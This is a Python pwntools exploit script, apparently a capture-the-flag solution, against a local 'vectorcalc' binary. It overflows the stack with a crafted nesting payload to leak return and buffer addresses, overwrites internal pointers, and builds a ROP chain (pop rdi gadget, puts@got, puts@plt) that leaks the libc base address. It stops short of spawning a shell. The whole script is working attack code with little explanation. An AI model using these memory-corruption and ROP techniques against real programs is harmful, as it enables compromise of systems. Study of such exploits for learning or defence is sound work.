import requests
from urllib import quote
import xml.etree.ElementTree as ET
from pwn import *

STACK_SIZE = 32
VECTOR_WIDTH = 8

OFFSET = -1

BUF_ADDR_ID = 1
VARS_ADDR_ID = 4
RET_ADDR_ID = 7

MAIN_ADDR = -1

# converts hex string '0x956fa79a4dd7cd00' to double string representation '-1.97192842818324546837e-205'
def payload_to_double(hex_x):
    url = 'https://gregstoll.dyndns.org/~gregstoll/floattohex/floattohex.cgi?action=hextodouble&hex=' + quote(hex_x)
    resp = requests.get(url)
    values = ET.fromstring(resp.content)
    return values[0].text

# converts double string '-1.97192842818324546837e-205' to hex string representation '0x956fa79a4dd7cd00'
def double_to_hex(dec_x):
    url = 'https://gregstoll.dyndns.org/~gregstoll/floattohex/floattohex.cgi?action=doubletohex&double=' + quote(dec_x)
    resp = requests.get(url)
    values = ET.fromstring(resp.content)
    return values[1].text

def find_offset(compute_ret_addr):
    global OFFSET
    local_compute_ret_addr = 0x555555555d5b
    OFFSET = local_compute_ret_addr - compute_ret_addr

def putsplt_addr():
    local_putsplt_addr = 0x555555555040 # p.elf.symbols['plt.puts'] 
    return local_putsplt_addr - OFFSET

def putsgot_addr():
    local_putsgot_addr = 0x555555558020 # p.elf.symbols['got.puts'] 
    return local_putsgot_addr - OFFSET

def pop_rdi_gadget_addr():
    local_pop_rdi_gadget_addr = 0x555555555d90
    return local_pop_rdi_gadget_addr - OFFSET

# converts endianess ex. '0x414243' to '0x43424100' and fill with zeros
def revert(hex):
    res = ''
    for i in range(len(hex) - 1, 2, -2):
        res += hex[i - 1]
        res += hex[i]
    pad_len = 8 - len(res) / 2
    res += '00' * pad_len
    res = '0x' + res
    return res


def override_vars_and_buf_addr(p):
    # (((((((((((((((((((((((((((((((+)))))))))))))))))))))))))))))))
    payload = b'(' * (STACK_SIZE - 1) + b'+' + b')' * (STACK_SIZE - 1)
    log.info("Sending: " + payload)
    p.sendline(payload)
    resp = p.recvline().strip()
    log.info("Received: " + resp)
    payload = []
    for i in range(VECTOR_WIDTH):
        hex_addr = resp.split(',')[i][1:]
        if i == VECTOR_WIDTH - 1:
            hex_addr = hex_addr[:-1]
        payload.append(hex_addr)

    global MAIN_ADDR
    MAIN_ADDR = payload[RET_ADDR_ID]

    # save address of compute to find OFFSET later    
    compute_ret_addr = int(double_to_hex(payload[RET_ADDR_ID]), 16)
    
    # override buf address
    payload[BUF_ADDR_ID] = str(payload_to_double(str(hex(int(double_to_hex(payload[BUF_ADDR_ID]), 16) + 1024))))
    # override vars address
    payload[VARS_ADDR_ID] = str(payload_to_double(str(hex(int(double_to_hex(payload[VARS_ADDR_ID]), 16) - 1032))))

    payload = b'-' * (STACK_SIZE - 1) + b'{' +  b', '.join(payload) + b'}'
    log.info("Sending:" + payload)
    p.sendline(payload)
    resp = p.recvline().strip()
    log.info("Received: " + resp)

    return compute_ret_addr

def find_libc_offset(p, compute_ret_addr):
    # find puts libc addr
    pop_rdi_gadzet = payload_to_double(hex(pop_rdi_gadget_addr()))
    putsgot = payload_to_double(hex(putsgot_addr()))
    putsplt = payload_to_double(hex(putsplt_addr()))

    payload = ['0'] * VECTOR_WIDTH 
    payload[0] = pop_rdi_gadzet
    payload[1] = putsgot # puts libc addr should be in got
    payload[2] = putsplt
    payload[3] = MAIN_ADDR # we want to get back to main
    
    # a={4.63557053866075e-310, 4.6355705390979e-310, 4.63557053849238e-310, -4.63557053865813416291e-310, 0, 0, 0, 0}
    payload = b'a={' + b', '.join(payload) + b'}'
    log.info("Sending: " + payload)
    p.sendline(payload)

    resp = p.recvline(keepends=False).encode('hex')
    resp = '0x' + resp + '0' * (16 - len(resp))
    puts_libc = revert(resp)
    log.info("puts_libc: " + puts_libc)

    libc_elf = ELF('libc.so.6')
    puts_offset = libc_elf.symbols['puts']
    libc_base = int(puts_libc, 16) - puts_offset
    log.info("libc_base: " + hex(libc_base))

    p.sendline(payload)
    resp = p.recvline(keepends=False).encode('hex')
    print(resp)

def main():
    # libc_elf = ELF('libc.so.6')
    # stdin_offset = libc_elf.symbols['stdin']
    # print(hex(stdin_offset))
    # return 
    p = process('./vectorcalc')

    compute_ret_addr = override_vars_and_buf_addr(p)
    
    find_offset(compute_ret_addr)
    log.info("Offset: " + str(OFFSET))

    find_libc_offset(p, compute_ret_addr)

    p.wait_for_close()
    print(p.poll())

if __name__ == '__main__':
    main()